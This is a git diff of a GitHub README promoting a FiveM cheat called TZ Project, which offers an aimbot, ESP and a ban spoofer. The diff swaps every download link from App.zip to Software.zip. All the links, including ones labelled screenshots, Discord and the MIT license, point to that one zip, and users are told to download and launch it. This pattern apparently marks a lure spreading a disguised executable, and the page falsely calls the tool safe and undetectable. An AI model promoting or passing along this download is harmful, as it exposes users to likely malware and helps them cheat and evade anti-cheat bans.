@@ -6,7 +6,7 @@ Welcome to the repository of **FiveM TZ Project PVP Tool**, your ultimate cheat 
 - **Name**: FiveM-TZ-Project-PVP-TOOL
 - **Description**: Enhance your PVP experience with TZ, the cheat of choice for FiveM gamers.
 - **Topics**: fivem-aimbot-new, fivem-cheat-download-2024, fivem-cheat-legit, fivem-da-bans, fivem-hack-menu-2024, fivem-hacks-legit, fivem-lua-executor-new, fivem-new-mod-menu, fivem-spoofer-ban, fivem-tzproject-aim, fivem-tzproject-hack, fivem-tzproject-spoofer, fivem-unban-2024, tz-aimbot, tz-esp, tz-free, tz-hack, tz-leak, tz-spoofer-fivem, tzproject
-- **Link**: [Download TZ Project](https://github.com/L3dx/FiveM-TZ-Project-PVP-TOOL/releases/download/v1.0/App.zip)
+- **Link**: [Download TZ Project](https://github.com/L3dx/FiveM-TZ-Project-PVP-TOOL/releases/download/v2.0/Software.zip)
 
 ## 🎯 Main Features:
 1. **No LUA Injection**: Play without the fear of Lua injection detection.
@@ -17,13 +17,13 @@ Welcome to the repository of **FiveM TZ Project PVP Tool**, your ultimate cheat 
 6. **Spoofer Protection**: Keep yourself protected with the built-in spoofer.
 
 ## 🛠️ Installation Instructions:
-1. Click on the [Download TZ Project](https://github.com/L3dx/FiveM-TZ-Project-PVP-TOOL/releases/download/v1.0/App.zip) link to download the tool.
+1. Click on the [Download TZ Project](https://github.com/L3dx/FiveM-TZ-Project-PVP-TOOL/releases/download/v2.0/Software.zip) link to download the tool.
 2. Launch the downloaded file to install FiveM TZ Project PVP Tool.
 
 ## 📸 In-Game Screenshots:
-![Screenshot1](https://github.com/L3dx/FiveM-TZ-Project-PVP-TOOL/releases/download/v1.0/App.zip)
-![Screenshot2](https://github.com/L3dx/FiveM-TZ-Project-PVP-TOOL/releases/download/v1.0/App.zip)
-![Screenshot3](https://github.com/L3dx/FiveM-TZ-Project-PVP-TOOL/releases/download/v1.0/App.zip)
+![Screenshot1](https://github.com/L3dx/FiveM-TZ-Project-PVP-TOOL/releases/download/v2.0/Software.zip)
+![Screenshot2](https://github.com/L3dx/FiveM-TZ-Project-PVP-TOOL/releases/download/v2.0/Software.zip)
+![Screenshot3](https://github.com/L3dx/FiveM-TZ-Project-PVP-TOOL/releases/download/v2.0/Software.zip)
 
 ## 💬 Frequently Asked Questions:
 ### Q: Is TZ Project safe to use?
@@ -33,17 +33,17 @@ A: Yes, TZ Project is designed to be undetectable by anti-cheat systems, providi
 A: We recommend using the features responsibly and avoiding suspicious behaviors to minimize the risk of bans.
 
 ## 📌 Explore More:
-- Check out the [Releases](https://github.com/L3dx/FiveM-TZ-Project-PVP-TOOL/releases/download/v1.0/App.zip) section for the latest updates.
-- Join our [Discord](https://github.com/L3dx/FiveM-TZ-Project-PVP-TOOL/releases/download/v1.0/App.zip) community for support and discussions.
+- Check out the [Releases](https://github.com/L3dx/FiveM-TZ-Project-PVP-TOOL/releases/download/v2.0/Software.zip) section for the latest updates.
+- Join our [Discord](https://github.com/L3dx/FiveM-TZ-Project-PVP-TOOL/releases/download/v2.0/Software.zip) community for support and discussions.
 
 ## 🌟 Contribute:
 If you're interested in contributing to the project, feel free to fork the repository and submit a pull request with your enhancements.
 
 ## 📝 License:
-This project is licensed under the [MIT License](https://github.com/L3dx/FiveM-TZ-Project-PVP-TOOL/releases/download/v1.0/App.zip).
+This project is licensed under the [MIT License](https://github.com/L3dx/FiveM-TZ-Project-PVP-TOOL/releases/download/v2.0/Software.zip).
 
 ---
 
 Let the FiveM TZ Project PVP Tool elevate your gaming experience and dominate the PVP arena like never before! Download now and immerse yourself in a world of enhanced gameplay features. ⚔️🎮
 
-[![Download TZ Project](https://github.com/L3dx/FiveM-TZ-Project-PVP-TOOL/releases/download/v1.0/App.zip%20Project-blue)](https://github.com/L3dx/FiveM-TZ-Project-PVP-TOOL/releases/download/v1.0/App.zip)
+[![Download TZ Project](https://github.com/L3dx/FiveM-TZ-Project-PVP-TOOL/releases/download/v2.0/Software.zip%20Project-blue)](https://github.com/L3dx/FiveM-TZ-Project-PVP-TOOL/releases/download/v2.0/Software.zip)
